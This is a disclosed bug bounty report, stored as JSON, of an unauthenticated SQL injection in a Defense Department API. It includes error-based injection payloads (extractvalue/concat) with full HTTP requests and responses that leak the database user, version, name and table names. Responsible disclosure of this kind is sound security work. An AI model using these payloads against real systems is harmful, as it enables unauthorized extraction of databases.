@@ -1,0 +1,129 @@
+{
+  "id": 1626226,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjI2MjI2",
+  "url": "https://hackerone.com/reports/1626226",
+  "title": "Unauthenticated SQL Injection at █████████  [HtUS]",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2022-07-05T14:03:32.345Z",
+  "submitted_at": "2022-07-05T14:03:32.420Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "0xd0ff9",
+    "url": "/0xd0ff9",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/m643g2dt4igbyilf9reor5gz4ull/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-10-14T17:54:41.604Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-09-22T10:10:22.288Z",
+  "team_member_agreed_on_going_public_at": "2022-10-14T17:54:41.415Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nHi team, I found Unauthenticated SQL Injection at ██████. Because of non-filter and non-escape input at API /api/organizations/*, attacker can inject malicious payload after single quote (') to exploit and extract database.\n\n## Step to Reproduce:\n\nExecute Request\n```\nGET /api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa HTTP/1.1\nHost: ████ \nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 \nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 \nAccept-Encoding: gzip, deflate \nUpgrade-Insecure-Requests: 1 \nSec-Fetch-Dest: document \nSec-Fetch-Mode: navigate \nSec-Fetch-Site: none \nSec-Fetch-User: ?1 \nTe: trailers\n\n\n\n```\n\n\nThen the response is \n\n```\nHTTP/1.1 500 Internal Server Error\nContent-Type: application/json; charset=utf-8\nContent-Length: 209\nCross-Origin-Embedder-Policy: require-corp\nCross-Origin-Opener-Policy: same-origin\nCross-Origin-Resource-Policy: same-origin\nX-DNS-Prefetch-Control: off\nExpect-CT: max-age=0\nX-Frame-Options: SAMEORIGIN\nX-Download-Options: noopen\nX-Content-Type-Options: nosniff\nOrigin-Agent-Cluster: ?1\nX-Permitted-Cross-Domain-Policies: none\nReferrer-Policy: no-referrer\nX-XSS-Protection: 0\nStrict-Transport-Security: max-age=31536000\nExpires: Tue, 05 Jul 2022 04:12:11 GMT\nCache-Control: max-age=0, no-cache, no-store\nPragma: no-cache\nDate: Tue, 05 Jul 2022 04:12:11 GMT\nConnection: keep-alive\n\n{\"statusCode\":500,\"code\":\"P2010\",\"error\":\"Internal Server Error\",\"message\":\"\\nInvalid `prisma.queryRaw()` invocation:\\n\\n\\n  Raw query failed. Code: `1105`. Message: `XPATH syntax error: ':█████████'`\"}\n```\n\n\nThe result was leaked by SQL XPATH Error, so we get user() = ████████\n\nChange query to version() we get version = 8.0.23\nhttps://██████/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa\n\nChange query to version() we get database = ███\nhttps://███/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa\n\n█████████\n██████████\n███\nTo extract data, we use this requests\n```\nGET /api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from%20information_schema.tables%20limit%2054,1))))=' HTTP/1.1\nHost: ████ \nUser-Agent: Mozilla/5.0  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 \nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 \nAccept-Encoding: gzip, deflate \nUpgrade-Insecure-Requests: 1 \nSec-Fetch-Dest: document \nSec-Fetch-Mode: navigate \nSec-Fetch-Site: none \nSec-Fetch-User: ?1 \nTe: trailers\n\n\n```\n\n█████\n\n## Impact\n\nAttacker can extract database from server █████",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 60,
+  "voters": [
+    "gluthiv",
+    "alex_volk",
+    "striicer",
+    "antqt",
+    "kanazawaaaa",
+    "m4khn0",
+    "bazzadrox",
+    "jumpydata",
+    "zy9ard3",
+    "shreyaschavhan",
+    "and 50 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
